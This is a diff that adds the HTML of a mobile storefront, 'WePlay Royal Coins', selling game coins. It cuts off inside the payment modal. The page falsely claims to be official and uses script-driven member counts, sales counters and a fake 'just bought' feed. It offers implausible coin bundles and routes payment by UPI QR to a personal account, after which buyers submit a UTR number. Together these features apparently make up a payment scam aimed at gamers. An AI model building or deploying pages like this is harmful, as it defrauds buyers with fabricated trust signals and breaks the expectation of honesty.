@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="hi" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>WePlay Royal Coins — Official Instant Top-Up</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- QR Code Generator Library (Generates crisp scannable UPI QR for queen-simran@pthdfc) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <!-- Google Fonts: Inter & Outfit -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Outfit:wght@700;800;900&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            display: ['Outfit', 'sans-serif'],
+          },
+          colors: {
+            void: '#07080F',
+            card: '#111424',
+            cardHover: '#171C32',
+            gold: '#F59E0B',
+            neonCyan: '#00F0FF',
+            neonPurple: '#9D4EDD',
+            neonGreen: '#10B981',
+          },
+          animation: {
+            'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+            'float': 'float 3.5s ease-in-out infinite',
+          },
+          keyframes: {
+            float: {
+              '0%, 100%': { transform: 'translateY(0px)' },
+              '50%': { transform: 'translateY(-6px)' },
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      background-color: #07080F;
+      color: #F8FAFC;
+      -webkit-tap-highlight-color: transparent;
+      overflow-x: hidden;
+    }
+
+    /* Ambient Neon Background Glows */
+    .bg-mesh {
+      background-image: 
+        radial-gradient(circle at 15% 8%, rgba(157, 78, 221, 0.18) 0%, transparent 45%),
+        radial-gradient(circle at 85% 16%, rgba(0, 240, 255, 0.15) 0%, transparent 42%),
+        radial-gradient(circle at 50% 55%, rgba(245, 158, 11, 0.1) 0%, transparent 55%);
+    }
+
+    /* Glassmorphism Cards */
+    .glass-panel {
+      background: rgba(17, 20, 36, 0.88);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.09);
+    }
+
+    .gold-glow {
+      box-shadow: 0 0 32px rgba(245, 158, 11, 0.38);
+    }
+
+    .cyan-glow {
+      box-shadow: 0 0 24px rgba(0, 240, 255, 0.25);
+    }
+
+    .pack-card {
+      transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .pack-card:hover {
+      transform: translateY(-2px);
+    }
+
+    .pack-card:active {
+      transform: scale(0.97);
+    }
+
+    /* Smooth slide-in animation for new live feed items */
+    @keyframes slideInRow {
+      0% { opacity: 0; transform: translateY(-14px) scale(0.98); background-color: rgba(245, 158, 11, 0.18); }
+      100% { opacity: 1; transform: translateY(0) scale(1); background-color: rgba(255, 255, 255, 0.03); }
+    }
+
+    .feed-row-new {
+      animation: slideInRow 0.55s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+    }
+
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar {
+      width: 5px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #07080F;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #1E243B;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body class="bg-mesh min-h-screen flex flex-col items-center selection:bg-amber-500 selection:text-black">
+
+  <!-- Spacious Mobile-First & Responsive Container -->
+  <div class="w-full max-w-[560px] min-h-screen flex flex-col px-4 sm:px-6 pt-7 pb-14 relative">
+
+    <!-- Custom Toast Notification Banner (Replaces alert()) -->
+    <div id="toastBox" class="fixed top-4 left-1/2 -translate-x-1/2 z-50 w-[92%] max-w-[460px] pointer-events-none opacity-0 transition-all duration-300 transform -translate-y-3">
+      <div class="glass-panel border-amber-500/40 rounded-2xl px-4 py-3.5 shadow-2xl flex items-center gap-3">
+        <span id="toastIcon" class="text-xl">⚡</span>
+        <p id="toastMsg" class="text-xs sm:text-sm font-semibold text-white leading-snug"></p>
+      </div>
+    </div>
+
+    <!-- ==================== 1. HEADER & BRANDING ==================== -->
+    <header class="flex flex-col items-center text-center mb-6">
+      <!-- Glowing 3D-Style Gold/Neon Coin SVG Logo -->
+      <div class="relative mb-3.5 animate-float">
+        <div class="absolute inset-0 rounded-full bg-amber-500/35 blur-2xl scale-110"></div>
+        <svg class="w-24 h-24 sm:w-28 sm:h-28 relative z-10 drop-shadow-[0_0_20px_rgba(245,158,11,0.75)]" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="coinOuter" x1="15" y1="10" x2="105" y2="110" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#FEF3C7"/>
+              <stop offset="45%" stop-color="#F59E0B"/>
+              <stop offset="100%" stop-color="#B45309"/>
+            </linearGradient>
+            <linearGradient id="coinInner" x1="25" y1="25" x2="95" y2="95" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#78350F"/>
+              <stop offset="50%" stop-color="#D97706"/>
+              <stop offset="100%" stop-color="#FBBF24"/>
+            </linearGradient>
+            <linearGradient id="neonRim" x1="0" y1="0" x2="120" y2="120" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#00F0FF"/>
+              <stop offset="100%" stop-color="#F59E0B"/>
+            </linearGradient>
+          </defs>
+          <!-- Outer Neon Ring -->
+          <circle cx="60" cy="60" r="56" stroke="url(#neonRim)" stroke-width="2.8" stroke-dasharray="8 4" opacity="0.9"/>
+          <!-- Main Gold Coin Body -->
+          <circle cx="60" cy="60" r="48" fill="url(#coinOuter)" stroke="#FEF3C7" stroke-width="2.2"/>
+          <!-- Inner Recessed Ring -->
+          <circle cx="60" cy="60" r="38" fill="url(#coinInner)" stroke="#FDE68A" stroke-width="1.6" stroke-opacity="0.8"/>
+          <!-- Royal Crown Icon -->
+          <path d="M40 43L46 33L54 40L60 30L66 40L74 33L80 43H40Z" fill="#FEF3C7"/>
+          <!-- Bold Stylized 'W' Emblem -->
+          <path d="M36 51L44 77L53 60L60 73L67 60L76 77L84 51H76L71 66L63 52H57L49 66L44 51H36Z" fill="#FFFBEB"/>
+          <!-- Sparkles -->
+          <circle cx="28" cy="36" r="2.8" fill="#00F0FF"/>
+          <circle cx="92" cy="84" r="2.8" fill="#00F0FF"/>
+        </svg>
+      </div>
+
+      <!-- Official Status Badge -->
+      <div class="inline-flex items-center gap-2 px-3.5 py-1 rounded-full bg-amber-500/15 border border-amber-500/35 mb-2">
+        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
+        <span class="text-[11px] font-extrabold uppercase tracking-[0.16em] text-amber-300">Official Instant Top-Up Vault</span>
+      </div>
+
+      <!-- Large Bold Brand Name -->
+      <h1 class="font-display text-4xl sm:text-5xl font-black tracking-tight bg-gradient-to-r from-amber-200 via-amber-400 to-cyan-300 bg-clip-text text-transparent drop-shadow-sm">
+        WePlay Royal Coins
+      </h1>
+      <p class="text-xs sm:text-sm text-slate-400 mt-1.5 font-medium">
+        Fastest Automated WePlay Coin Store • 24/7 Instant Delivery
+      </p>
+    </header>
+
+    <!-- ==================== 2. FLANKING MEMBER STATS & TOTAL COINS SOLD ==================== -->
+    <section class="mb-7">
+      <!-- Left (Buy Members: 40k-50k) & Right (Active Members: 50k-60k) Flanking Row -->
+      <div class="grid grid-cols-2 gap-3 mb-3.5">
+        <!-- Left Side: Buy Members (40,000 - 50,000) -->
+        <div class="glass-panel rounded-2xl p-3.5 flex items-center gap-3 border-l-4 border-l-amber-400">
+          <div class="w-10 h-10 rounded-xl bg-amber-500/15 flex items-center justify-center shrink-0 text-amber-400">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"/>
+            </svg>
+          </div>
+          <div class="text-left overflow-hidden">
+            <p class="text-[11px] font-bold uppercase tracking-wider text-slate-400 truncate">Buy Members</p>
+            <p id="buyMembersCount" class="font-display text-lg sm:text-xl font-extrabold text-amber-300 leading-tight">46,428</p>
+          </div>
+        </div>
+
+        <!-- Right Side: Active Members (50,000 - 60,000) -->
+        <div class="glass-panel rounded-2xl p-3.5 flex items-center justify-end gap-3 border-r-4 border-r-cyan-400 text-right">
+          <div class="overflow-hidden">
+            <div class="flex items-center justify-end gap-1.5">
+              <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+              <p class="text-[11px] font-bold uppercase tracking-wider text-slate-400 truncate">Active Members</p>
+            </div>
+            <p id="activeMembersCount" class="font-display text-lg sm:text-xl font-extrabold text-cyan-300 leading-tight">54,892</p>
+          </div>
+          <div class="w-10 h-10 rounded-xl bg-cyan-500/15 flex items-center justify-center shrink-0 text-cyan-400">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/>
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <!-- Center Prominent Stat: Total Coins Sold (Starts at 10,00,000 and slowly increments) -->
+      <div class="glass-panel rounded-3xl p-5 sm:p-6 text-center relative overflow-hidden border border-amber-500/35 gold-glow">
+        <div class="absolute inset-x-0 top-0 h-[3px] bg-gradient-to-r from-transparent via-amber-400 to-transparent"></div>
+        <p class="text-xs font-extrabold uppercase tracking-[0.2em] text-amber-300 mb-1.5 flex items-center justify-center gap-2">
+          <span class="text-base">🪙</span> Total Coins Sold Live
+        </p>
+        <div id="totalCoinsSold" class="font-display text-4xl sm:text-5xl font-black tracking-wide text-white drop-shadow-[0_0_16px_rgba(245,158,11,0.55)]">
+          10,00,000
+        </div>
+        <p class="text-xs text-emerald-400 mt-2 font-semibold flex items-center justify-center gap-1.5">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/>
+          </svg>
+          Auto-delivering coins 24/7 • Zero Ban Guarantee
+        </p>
+      </div>
+
+      <!-- Trust & Security Badges Strip -->
+      <div class="grid grid-cols-3 gap-2.5 mt-3.5">
+        <div class="glass-panel rounded-2xl p-2.5 text-center border border-white/5">
+          <div class="text-base mb-0.5">⚡</div>
+          <p class="text-[11px] font-bold text-white">Instant Top-Up</p>
+          <p class="text-[10px] text-slate-400">Under 10 Mins</p>
+        </div>
+        <div class="glass-panel rounded-2xl p-2.5 text-center border border-white/5">
+          <div class="text-base mb-0.5">🛡️</div>
+          <p class="text-[11px] font-bold text-white">100% Safe ID</p>
+          <p class="text-[10px] text-slate-400">No Password Needed</p>
+        </div>
+        <div class="glass-panel rounded-2xl p-2.5 text-center border border-white/5">
+          <div class="text-base mb-0.5">🎁</div>
+          <p class="text-[11px] font-bold text-white">Mega Bonus</p>
+          <p class="text-[10px] text-slate-400">Extra Free Coins</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== 3. WEPLAY ID VERIFICATION SECTION ==================== -->
+    <section class="mb-7">
+      <!-- State A: Unverified Input Panel -->
+      <div id="verifyInputPanel" class="glass-panel rounded-3xl p-5 border border-cyan-500/35 cyan-glow transition-all duration-300">
+        <div class="flex items-center justify-between mb-2.5">
+          <label for="weplayIdInput" class="text-xs sm:text-sm font-extrabold uppercase tracking-wider text-cyan-300 flex items-center gap-2">
+            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2"/>
+            </svg>
+            WePlay Verify ID
+          </label>
+          <span class="text-[11px] font-semibold text-cyan-200 bg-cyan-500/15 border border-cyan-500/30 px-2.5 py-0.5 rounded-full">Step 1: Required</span>
+        </div>
+
+        <div class="flex gap-2.5">
+          <input 
+            type="text" 
+            id="weplayIdInput" 
+            inputmode="numeric"
+            placeholder="Apna WePlay ID dalein..." 
+            class="w-full bg-[#090B16] border border-slate-700/80 focus:border-cyan-400 rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-white placeholder-slate-500 outline-none transition-colors"
+          />
+          <button 
+            id="verifyIdBtn"
+            onclick="handleVerifyId()"
+            class="shrink-0 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 active:scale-95 text-white font-extrabold text-xs sm:text-sm uppercase tracking-wider px-5 py-3.5 rounded-2xl shadow-lg shadow-cyan-500/30 transition-all flex items-center gap-1.5"
+          >
+            <span id="verifyBtnText">Verify ID</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- State B: Verified Badge Panel (Shown after verification, input panel hidden) -->
+      <div id="verifiedBadgePanel" class="hidden glass-panel rounded-3xl p-4 sm:p-5 border border-emerald-500/50 bg-emerald-950/30 shadow-[0_0_24px_rgba(16,185,129,0.25)] transition-all duration-300">
+        <div class="flex items-center justify-between">
+          <div class="flex items-center gap-3">
+            <div class="w-11 h-11 rounded-2xl bg-emerald-500/20 border border-emerald-400/40 flex items-center justify-center text-emerald-400">
+              <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2.8" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+              </svg>
+            </div>
+            <div>
+              <div class="flex items-center gap-2">
+                <span class="text-base font-extrabold text-emerald-400 tracking-wide">Verified ✓</span>
+                <span class="text-[11px] bg-emerald-500/20 text-emerald-300 px-2.5 py-0.5 rounded-full font-bold">Active ID</span>
+              </div>
+              <p class="text-xs sm:text-sm text-slate-300 font-semibold mt-0.5">WePlay ID: <span id="verifiedIdDisplay" class="text-white font-extrabold tracking-wider"></span></p>
+            </div>
+          </div>
+          <button 
+            onclick="resetVerifyId()" 
+            class="text-xs font-bold text-slate-300 hover:text-white bg-white/10 hover:bg-white/15 px-3 py-2 rounded-xl transition-colors"
+          >
+            Change
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== 4. VIP MEGA BONUS PROMO BANNER ==================== -->
+    <section class="mb-7">
+      <div class="rounded-3xl p-4 sm:p-5 bg-gradient-to-r from-amber-500/20 via-purple-600/20 to-cyan-500/20 border border-amber-400/40 flex items-center justify-between gap-3">
+        <div>
+          <span class="inline-block text-[10px] font-black uppercase tracking-widest bg-amber-400 text-black px-2.5 py-0.5 rounded-full mb-1">
+            Double Coin Festival 🎉
+          </span>
+          <h3 class="font-display text-base sm:text-lg font-extrabold text-white">Up to +13,00,000 Extra Bonus Coins!</h3>
+          <p class="text-xs text-slate-300 mt-0.5">₹99 se lekar ₹20,000 tak har pack par ab zyada coins payein.</p>
+        </div>
+        <div class="text-3xl sm:text-4xl shrink-0 animate-bounce">👑</div>
+      </div>
+    </section>
+
+    <!-- ==================== 5. COIN PRICING PACKAGES GRID (₹99 to ₹20,000) ==================== -->
+    <section class="mb-8">
+      <div class="flex items-center justify-between mb-4 px-0.5">
+        <h2 class="font-display text-xl sm:text-2xl font-black text-white flex items-center gap-2.5">
+          <span class="w-2.5 h-6 rounded-full bg-gradient-to-b from-amber-400 to-orange-500"></span>
+          Select Coin Pack
+        </h2>
+        <span class="text-xs font-bold text-amber-400 bg-amber-500/15 border border-amber-500/30 px-3 py-1 rounded-full">
+          High Value Packs ⚡
+        </span>
+      </div>
+
+      <!-- 2-Column Mobile-First Spacious Pricing Grid -->
+      <div id="packagesGrid" class="grid grid-cols-2 gap-3 sm:gap-4">
+        <!-- Populated dynamically via JS -->
+      </div>
+    </section>
+
+    <!-- ==================== 6. LIVE "JUST BOUGHT" FEED (12 PEOPLE) ==================== -->
+    <section class="mb-8">
+      <div class="glass-panel rounded-3xl p-4 sm:p-5 border border-purple-500/35 bg-gradient-to-b from-[#131629] via-[#17132E] to-[#111424] relative overflow-hidden">
+        <div class="flex items-center justify-between pb-3 mb-3 border-b border-white/10">
+          <div class="flex items-center gap-2">
+            <span class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping"></span>
+            <h3 class="font-display text-base sm:text-lg font-extrabold text-white tracking-wide">
+              Just Bought Live Feed
+            </h3>
+          </div>
+          <span class="text-[11px] font-bold text-purple-300 bg-purple-500/20 border border-purple-500/30 px-2.5 py-0.5 rounded-full">
+            12 Recent Orders
+          </span>
+        </div>
+
+        <!-- 12 Simultaneous Live Buyer Rows -->
+        <div id="justBoughtList" class="space-y-2.5">
+          <!-- Populated dynamically with 12 live buyer items -->
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== 7. HOW TO BUY GUIDE ==================== -->
+    <section class="mb-8">
+      <div class="glass-panel rounded-3xl p-5 sm:p-6 border border-white/10">
+        <h3 class="font-display text-lg sm:text-xl font-extrabold text-white mb-4 flex items-center gap-2">
+          <span class="text-amber-400 text-xl">📖</span> Kaise Buy Karein? (How to Buy)
+        </h3>
+        <div class="space-y-3.5 text-xs sm:text-sm text-slate-300">
+          <div class="flex items-start gap-3 bg-white/[0.03] p-3 rounded-2xl border border-white/5">
+            <span class="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-300 font-extrabold text-xs flex items-center justify-center shrink-0 mt-0.5">1</span>
+            <p><strong class="text-white">WePlay ID Verify Karein:</strong> Upar apna WePlay User ID daal kar <span class="text-cyan-300 font-bold">Verify ID</span> button par click karein.</p>
+          </div>
+          <div class="flex items-start gap-3 bg-white/[0.03] p-3 rounded-2xl border border-white/5">
+            <span class="w-6 h-6 rounded-full bg-amber-500/20 text-amber-300 font-extrabold text-xs flex items-center justify-center shrink-0 mt-0.5">2</span>
+            <p><strong class="text-white">Coin Pack Chunein:</strong> Apne budget ke hisaab se ₹99 (2,500 Coins) se ₹20,000 (18,00,000 Coins) tak koi bhi pack select karke <span class="text-amber-300 font-bold">Buy</span> button dabayein.</p>
+          </div>
+          <div class="flex items-start gap-3 bg-white/[0.03] p-3 rounded-2xl border border-white/5">
+            <span class="w-6 h-6 rounded-full bg-purple-500/20 text-purple-300 font-extrabold text-xs flex items-center justify-center shrink-0 mt-0.5">3</span>
+            <p><strong class="text-white">QR Scan / UPI Payment Karein:</strong> Screen par dikhne wale QR code ko scan karein ya UPI ID copy karke payment complete karein.</p>
+          </div>
+          <div class="flex items-start gap-3 bg-white/[0.03] p-3 rounded-2xl border border-white/5">
+            <span class="w-6 h-6 rounded-full bg-emerald-500/20 text-emerald-300 font-extrabold text-xs flex items-center justify-center shrink-0 mt-0.5">4</span>
+            <p><strong class="text-white">12-Digit UTR ID Dalein:</strong> Payment ke baad apna 12-digit UTR / Ref No. daal kar submit karein. 10 minute ke andar coins aapke account mein credit ho jayenge!</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== 8. SUPPORT FOOTER ==================== -->
+    <footer class="mt-auto pt-2 text-center">
+      <div class="glass-panel rounded-3xl p-5 sm:p-6 border border-white/10">
+        <span class="inline-block text-[10px] font-extrabold uppercase tracking-[0.2em] text-amber-400 bg-amber-500/10 px-3 py-1 rounded-full mb-2">
+          24/7 Customer Support
+        </span>
+        <h4 class="font-display text-base sm:text-lg font-extrabold text-white mb-1">Need Help With Your Top-Up?</h4>
+        <p class="text-xs text-slate-400 mb-3.5">Kisi bhi payment ya coin issue ke liye humein email karein:</p>
+        
+        <div class="flex flex-col sm:flex-row items-center justify-center gap-2.5">
+          <a 
+            href="mailto:weplayroyal.support@gmail.com" 
+            class="w-full sm:w-auto inline-flex items-center justify-center gap-2 bg-white/5 hover:bg-white/10 border border-white/15 rounded-2xl px-4 py-3 text-xs sm:text-sm font-bold text-cyan-300 transition-colors"
+          >
+            <svg class="w-4 h-4 text-amber-400 shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/>
+            </svg>
+            weplayroyal.support@gmail.com
+          </a>
+          <button
+            type="button"
+            onclick="copySupportEmail()"
+            class="w-full sm:w-auto inline-flex items-center justify-center gap-1.5 bg-amber-500/15 hover:bg-amber-500/25 border border-amber-500/30 rounded-2xl px-4 py-3 text-xs font-bold text-amber-300 transition-colors"
+          >
+            📋 Copy Gmail
+          </button>
+        </div>
+
+        <p class="text-[11px] text-slate-500 mt-4">© 2026 WePlay Royal Coins Store. Instant Automated Top-Up.</p>
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- ==================== 9. CHECKOUT / UPI PAYMENT MODAL ==================== -->
+  <div id="paymentModal" class="fixed inset-0 z-50 hidden items-end sm:items-center justify-center bg-black/85 backdrop-blur-md p-0 sm:p-4 transition-opacity">
+    <div class="w-full max-w-[480px] bg-[#0E1120] border-t sm:border border-slate-700/80 rounded-t-3xl sm:rounded-3xl p-5 sm:p-6 max-h-[92vh] overflow-y-auto shadow-2xl relative">
+      
+      <!-- Modal Header -->
+      <div class="flex items-center justify-between pb-3.5 mb-4 border-b border-white/10">
+        <div>
+          <span class="text-[10px] font-bold uppercase tracking-widest text-amber-400">Secure UPI Checkout</span>
+          <h3 id="modalTitle" class="font-display text-lg sm:text-xl font-extrabold text-white">Complete Your Payment</h3>
+        </div>
+        <button 
+          onclick="closePaymentModal()" 
+          class="w-9 h-9 rounded-full bg-white/5 hover:bg-white/15 flex items-center justify-center text-slate-300 transition-colors"
+          aria-label="Close"
+        >
+          ✕
+        </button>
+      </div>
+
+      <!-- STEP 1: PAYMENT & UTR SUBMISSION VIEW (No timer shown here) -->
+      <div id="checkoutFormView">
+        <!-- Selected Pack Summary Banner -->
+        <div class="bg-gradient-to-r from-amber-500/15 to-cyan-500/15 border border-amber-500/35 rounded-2xl p-3.5 mb-4 flex items-center justify-between">
+          <div>
+            <p class="text-[11px] text-slate-300 font-medium">Selected Package</p>
+            <p id="modalCoinsText" class="font-display text-lg font-extrabold text-amber-300">2,500 Coins</p>
+          </div>
+          <div class="text-right">
+            <p class="text-[11px] text-slate-300 font-medium">Payable Amount</p>
+            <p id="modalPriceText" class="font-display text-2xl font-black text-white">₹99</p>
+          </div>
+        </div>
+
+        <!-- Clean White UPI QR Card for Simran Kumari (queen-simran@pthdfc) -->
+        <div class="bg-white rounded-2xl p-4 text-slate-900 mb-4 shadow-lg border-2 border-[#00BAF2]">
+          <!-- Merchant Profile Header -->
+          <div class="flex items-center justify-between border-b border-slate-100 pb-2.5 mb-3">
+            <div class="flex items-center gap-2.5">
+              <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-pink-500 to-amber-500 text-white font-bold text-sm flex items-center justify-center shadow">
+                SK
+              </div>
+              <div>
+                <div class="flex items-center gap-1">
+                  <span class="font-bold text-sm text-slate-900">Simran Kumari</span>
+                  <svg class="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                  </svg>
+                </div>
+                <p class="text-[11px] font-medium text-slate-500">Punjab & Sind Bank - 1687</p>
+              </div>
+            </div>
+            <span class="text-[10px] font-extrabold px-2 py-1 rounded bg-sky-50 text-[#002970] border border-sky-200">UPI QR</span>
+          </div>
+
+          <!-- Crisp Scannable QR Code Container -->
+          <div class="flex flex-col items-center justify-center my-2">
+            <div class="p-2.5 rounded-2xl border-4 border-[#00BAF2] bg-white shadow-inner">
+              <div id="upiQrContainer" class="w-[174px] h-[174px] flex items-center justify-center"></div>
+            </div>
+            <p class="text-[11px] font-semibold text-slate-600 mt-2">Scan with Paytm, PhonePe, GPay or any UPI App</p>
+          </div>
+
+          <!-- UPI ID Copy Bar -->
+          <div class="mt-2 bg-slate-100 rounded-xl p-2.5 flex items-center justify-between gap-2 border border-slate-200">
+            <div class="overflow-hidden">
+              <p class="text-[10px] font-bold uppercase text-slate-500">UPI ID</p>
+              <p id="upiIdText" class="text-xs font-extrabold text-slate-900 truncate">queen-simran@pthdfc</p>
+            </div>
+            <button 
+              type="button"
+              onclick="copyUpiId()"
+              class="shrink-0 bg-[#002970] hover:bg-blue-900 active:scale-95 text-white text-[11px] font-bold px-3.5 py-2 rounded-lg transition-all flex items-center gap-1"
+            >
+              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+              </svg>
+              Copy UPI
+            </button>
+          </div>
+        </div>
+
+        <!-- WePlay ID & UTR Input Form -->
+        <form id="utrSubmitForm" onsubmit="handlePaymentSubmit(event)" class="space-y-3.5">
+          <div>
+            <label for="modalWeplayId" class="block text-xs font-bold text-slate-300 mb-1">WePlay ID <span class="text-amber-400">*</span></label>
+            <input 
+              type="text" 
+              id="modalWeplayId" 
+              required
+              placeholder="Enter WePlay ID"
+              class="w-full bg-[#161B30] border border-slate-700 focus:border-cyan-400 rounded-xl px-3.5 py-3 text-sm font-bold text-white outline-none"
+            />
+          </div>
+
+          <div>
+            <label for="utrInput" class="block text-xs font-bold text-slate-300 mb-1">UTR / Reference ID (12 Digits) <span class="text-amber-400">*</span></label>
+            <input 
+              type="text" 
+              id="utrInput" 
+              inputmode="numeric"
+              required
+              minlength="6"
+              maxlength="22"
+              placeholder="e.g. 431298765432"
+              class="w-full bg-[#161B30] border border-slate-700 focus:border-amber-400 rounded-xl px-3.5 py-3 text-sm font-bold text-white placeholder-slate-500 outline-none tracking-wider"
+            />
+          </div>
+
+          <button 
+            type="submit"
+            id="submitUtrBtn"
+            class="w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 active:scale-[0.98] text-white font-display font-extrabold text-sm uppercase tracking-wider py-4 rounded-xl shadow-lg shadow-emerald-500/25 transition-all mt-2"
+          >
+            Verify & Submit Payment
+          </button>
+        </form>
+      </div>
+
+      <!-- STEP 2: 10-MINUTE COUNTDOWN TIMER VIEW (Appears ONLY AFTER UTR is submitted) -->
+      <div id="timerSuccessView" class="hidden text-center py-4">
+        <div class="w-16 h-16 rounded-full bg-emerald-500/20 border-2 border-emerald-400 flex items-center justify-center mx-auto mb-3 text-emerald-400 shadow-[0_0_25px_rgba(16,185,129,0.35)]">
+          <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+          </svg>
+        </div>
+
+        <span class="inline-block text-[11px] font-bold uppercase tracking-widest text-emerald-400 bg-emerald-500/15 px-3 py-1 rounded-full mb-2">
+          UTR Submitted Successfully
+        </span>
+        <h4 class="font-display text-xl font-extrabold text-white mb-1">Payment Under Verification</h4>
+        <p class="text-xs text-slate-300 max-w-xs mx-auto mb-5">
+          Aapka payment verify kiya ja raha hai. Coins 10 minute ke andar aapke WePlay ID par credit ho jayenge.
+        </p>
+
+        <!-- Live 10:00 Countdown Box -->
+        <div class="bg-[#151A2E] border border-amber-500/40 rounded-2xl p-4 mb-5 gold-glow">
+          <p class="text-[10px] font-bold uppercase tracking-[0.2em] text-amber-300 mb-1">Estimated Credit Time</p>
+          <div id="countdownTimerDisplay" class="font-display text-4xl font-black text-white tracking-widest">
+            10:00
+          </div>
+        </div>
+
+        <!-- Order Summary Receipt -->
+        <div class="bg-white/5 rounded-2xl p-3.5 text-left text-xs space-y-2 mb-5 border border-white/10">
+          <div class="flex justify-between">
+            <span class="text-slate-400">WePlay ID:</span>
+            <span id="receiptWeplayId" class="font-bold text-white">--</span>
+          </div>
+          <div class="flex justify-between">
+            <span class="text-slate-400">Coins Package:</span>
+            <span id="receiptCoins" class="font-bold text-amber-300">--</span>
+          </div>
+          <div class="flex justify-between">
+            <span class="text-slate-400">Amount Paid:</span>
+            <span id="receiptAmount" class="font-bold text-emerald-400">--</span>
+          </div>
